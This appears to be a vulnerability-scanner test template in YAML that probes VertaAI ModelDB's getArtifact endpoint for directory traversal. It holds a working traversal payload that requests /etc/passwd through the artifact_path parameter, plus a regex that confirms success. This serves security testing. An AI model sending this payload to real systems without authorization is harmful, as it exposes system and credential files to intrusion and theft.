id: VERTAAI_MODELDB_LFI
info:
  name: "VertaAI ModelDB Directory Traversal Test"
  description: "The VertaAI ModelDB Directory Traversal Test identifies potential vulnerabilities in the ModelDB component of VertaAI that could allow attackers to manipulate file paths and access files outside of the intended directory. This type of attack occurs when user inputs are not properly validated, enabling attackers to use traversal sequences like `../` to navigate through the file system. If exploited, this could lead to unauthorized file access, including sensitive configuration files or data. Proper input sanitization and secure file path handling are essential to mitigate such risks."
  details: "The VertaAI ModelDB Directory Traversal Test checks for vulnerabilities in the ModelDB storage system, where an attacker may exploit improper input validation to perform directory traversal attacks. By manipulating user input, attackers could craft requests containing sequences like `../` to move outside the intended directory, potentially exposing sensitive files or configurations stored on the server. If successful, this could lead to unauthorized access to critical information, which may be used for further exploitation. Implementing strict input validation and path sanitization helps prevent such vulnerabilities."
  impact: "The impact of a VertaAI ModelDB Directory Traversal vulnerability is significant, as it could allow unauthorized access to sensitive files or system configurations stored outside the intended directory. Exploiting this flaw could lead to information disclosure, such as the exposure of API keys, credentials, or other confidential data. Attackers may use this access to escalate privileges, compromise the system, or disrupt the integrity of the application. Proper path sanitization and access control mechanisms are crucial to mitigating these risks."
  category:
    name: LFI
    shortName: Local File Inclusion
    displayName: Local File Inclusion (LFI)
  subCategory: VERTAAI_MODELDB_LFI
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
  cwe:
    - CWE-98
    - CWE-22
  cve:
    - CVE-2021-39433
    - CVE-2023-22973


settings:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST
api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
wordLists:
  paths:
    - '/api/v1/artifact/getArtifact?artifact_path=../../../../../etc/passwd'
execute:
  type: single
  requests:
    - req:
        - modify_url: "${paths}"
        - modify_method: GET
        - replace_body: '{}'
validate:
  response_code:
    eq: 200
  response_payload:
    length:
      gt: 0
    regex: "root:.*:0:0:"
  response_headers:
    contains_either: "filename="
    for_one:
      key:
        eq: "content-type"
      value:
        eq: "application/octet-stream"
strategy:
  run_once: /
